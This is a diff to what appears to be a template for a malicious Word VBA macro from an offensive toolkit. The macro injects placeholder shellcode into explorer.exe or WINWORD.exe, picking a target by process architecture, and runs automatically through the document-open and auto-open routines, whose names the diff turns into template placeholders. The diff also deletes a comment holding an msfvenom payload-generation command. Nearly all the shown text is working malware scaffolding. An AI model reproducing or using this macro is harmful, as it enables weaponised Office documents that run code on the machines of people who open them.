@@ -24,7 +24,6 @@ Function JustE()
     ch64Arch = arch()
 
     If ch64Arch Then
-        'msfv3nom -p windows/x64/exec -f vbapplication CMD="calc.exe" EXITFUNC=thread
         buf = ####SHELLCODE####
         'grab handle to target, customizable
         pid = getPID("explorer.exe")
@@ -34,7 +33,6 @@ Function JustE()
         buf = ####SHELLCODE32####
 
         Handle = findWow64()
-        ' 32-bit Word running on 64-bit OS, no suitable proc found
         If Handle = 0 Then
             'grab handle to target, which has to be running if this macro is opened from word
             pid = getPID("WINWORD.exe")
@@ -125,9 +123,10 @@ Sub queen()
     Application.Run MacroName:="test"
 End Sub
 
-Sub Document_Open()
+Sub ####VBA_FILE_OPEN####()
     test
 End Sub
-Sub AutoOpen()
+
+Sub ####VBA_AUTO_OPEN####()
     test
 End Sub
